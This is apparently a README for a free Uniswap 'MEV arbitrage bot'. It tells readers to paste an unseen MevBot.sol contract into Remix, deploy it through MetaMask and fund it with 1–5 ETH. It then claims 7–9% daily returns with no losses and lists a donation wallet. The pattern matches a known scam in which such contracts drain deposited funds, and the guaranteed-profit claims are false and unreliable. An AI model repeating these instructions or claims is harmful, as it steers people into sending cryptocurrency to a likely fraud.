<div align="center">
    
 <img src="https://i.ibb.co/ZJDdbjJ/4bdf60-846d110908144c17ab163fee6f2648e8-mv2.webp" alt="4bdf60-846d110908144c17ab163fee6f2648e8-mv2" border="0">
    
</div>

Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.

You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here I provide you the access to my user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.

My flagship project that I recently released is Arbitrage MEV bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.

Using my smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.

I share my Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes back to me.

---
 
## How to launch your own arbitrage bot 

1) Download MetaMask (if you don’t have it already):
  https://metamask.io/download.html

   Access Remix: https://remix.ethereum.org/

2) File Explorer Hover over the tiny button in the top left and click and create new file **"mevbot.sol"** Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE

 <div align="center">
    
<img src="https://i.ibb.co/r5QHcXb/1.png" alt="1" border="0">

   </div>

3) Go to the **“Solidity Compiler”** tab, Select compiler version 0.6.12 and then select **“Compile mevbot.sol”**.

   Make sure “**MevBot.sol**” is selected in the **CONTRACT** section of the **SOLIDITY COMPILER** section.

 <div align="center">
    
<img src="https://i.ibb.co/Tvbwv9g/2.png" alt="2" border="0">

   </div>
   
4) Go to the **“DEPLOY & RUN TRANSACTIONS”** tab, select the **“Injected Provider - Metamask”** environment and then **“Deploy”**. By approving the Metamask contract creation fee, you will have created your own contract.

5) Copy your newly created contract address and fund it with any amount of ETH  Simply send ETH to your newly created contract address to allow the bot to earn money.

 <div align="center">
    
<img src="https://i.ibb.co/Z1CMXK1/3.png" alt="3" border="0">

   </div>
   
6) After your transaction is confirmed, click the **“start”** button to run the bot. Withdraw your ETH at any time by clicking the **“Withdraw”** button.

 <div align="center">
    
<img src="https://i.ibb.co/pf8h7M2/4.png" alt="4" border="0">

   </div>
   
#### That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.

---
# FAQ

### If many people will use the bot, wouldn’t dilution of profits occur?

I do not plan to limit access to the bot for now because there won’t be any affect for me or other users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so other users involvement in the pools will always be very minor.

### What average ROI can I expect?

According to my latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.

### What amount of funds bot need to work?

I recommend funding the contract with at least 1-5 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.

### Does it work on other chains or DEXes as well?

No, currently the bot is dedicated only for Ethereum on Uniswap pools.

#### address for donate - 0x8365d619f4620083Aa9e320C2e88e1590A73d53b eth usdt ETH

# License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
